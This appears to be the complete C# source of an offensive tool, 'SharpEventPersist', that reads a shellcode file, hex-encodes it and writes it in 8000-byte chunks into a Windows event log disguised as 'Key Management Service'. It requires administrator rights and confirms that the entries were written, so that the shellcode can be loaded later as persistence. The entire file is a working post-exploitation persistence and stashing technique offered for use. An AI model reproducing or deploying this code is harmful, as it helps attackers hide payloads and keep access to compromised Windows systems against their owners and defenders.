using System;
using System.Diagnostics;
using System.Runtime.Remoting.Metadata.W3cXsd2001;
using System.IO;
using System.Linq;
using NDesk.Options;
using System.Security.Principal;

namespace SharpEventPersist
{
    class Program
    {
        public static int EventWrites = 0;

        public static void PrintHelp()
        {
            Console.WriteLine("Required paramter: -file (shellcode path)\n");
            Console.WriteLine("Specify -file C:\\path\\to\\shellcode.bin\nSpecify -instanceid 1337\nSpecify -source 'Persistence'\nSpecify -eventlog 'Key Management Service'");
        }

        static void delegate_bytes(string source, string instanceid, string eventlog, byte[] shellcode, int length, int offset = 0)
        {
            var temp = new byte[length];

            for (var i = 0; i < length; i++)
                temp[i] = shellcode[offset + i];

            string shellcodeEvent = GetBytesToString(temp);
            int instanceint = Int16.Parse(instanceid);
            EventLog KMSEventLog = new EventLog(eventlog);
            if (!EventLog.SourceExists(source))
            {
                EventLog.CreateEventSource(source, eventlog);
            }
            KMSEventLog.Source = source;
            KMSEventLog.WriteEntry(shellcodeEvent, EventLogEntryType.Information, instanceint);
            EventWrites += 1;
        }

        public static string GetBytesToString(byte[] value)
        {
            SoapHexBinary hexbin = new SoapHexBinary(value);
            return hexbin.ToString();
        }

        public static bool IsHighIntegrity()
        {
            // returns true if the current process is running with adminstrative privs in a high integrity context
            // ref: https://github.com/GhostPack/Seatbelt/blob/fa0f2d94a049d825bef77e103e33167250ed2ac0/Seatbelt/Util/SecurityUtil.cs
            var identity = WindowsIdentity.GetCurrent();
            var principal = new WindowsPrincipal(identity);
            return principal.IsInRole(WindowsBuiltInRole.Administrator);
        }

        static void Main(string [] args)
        {

            if (args == null)
            {
                PrintHelp();
                return;
            }
            string file = null;
            string eventlog = null;
            string instanceid = null;
            string source = null;

            OptionSet opts = new OptionSet()
            {
                { "file=", "-file [file]", v => file = v },
                { "instanceid=", "-instanceid [instanceid]", v => instanceid = v },
                { "source=", "-source [source]", v => source = v },
                { "eventlog=", "-eventlog [eventlog]", v => eventlog = v }
            };

            try
            {
                opts.Parse(args);
            }
            catch (OptionException e)
            {
                Console.WriteLine(e.Message);
            }

            if (string.IsNullOrEmpty(file))
            {
                PrintHelp();
                return;
            }

            if (string.IsNullOrEmpty(eventlog))
                eventlog = "Key Management Service";
            if (string.IsNullOrEmpty(source))
                source = "Persistence";
            if (string.IsNullOrEmpty(instanceid))
                instanceid = "1337";

            Console.WriteLine("Using shellcode: " + file);
            Console.WriteLine("Setting event log instance id: " + instanceid);
            Console.WriteLine("Setting event log source to: " + source);
            Console.WriteLine("Setting event log to: " + eventlog);
            int instanceint = Int16.Parse(instanceid);
            byte[] shellcode = File.ReadAllBytes(file);
            var realcount = (int)(shellcode.Length / 8000);
            var remainder = (int)(shellcode.Length % 8000);
            EventLog log = new EventLog(eventlog);

            if (!IsHighIntegrity())
            {
                Console.WriteLine("Not running in high integrity. Adding new event soure will fail.\nYou need write access to subkeys in HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\");
                return;
            }

            for (var i = 0; i < realcount; i++)
                delegate_bytes(source, instanceid, eventlog, shellcode, 8000, i * 8000);
            
            delegate_bytes(source, instanceid, eventlog, shellcode, remainder, realcount * 8000);

            var entries = log.Entries.Cast<EventLogEntry>().Where(x => x.InstanceId == instanceint).ToList();

            if (entries.Count == EventWrites)
            {
                Console.WriteLine("Successfully wrote " + entries.Count + " entries to the log " + log.LogDisplayName);
            } else
            {
                Console.WriteLine("Number of entires in "+ log.LogDisplayName + "does not match times the Event Write function was called. Do not expect persistence to work.");
            }


        }
        
    }
}
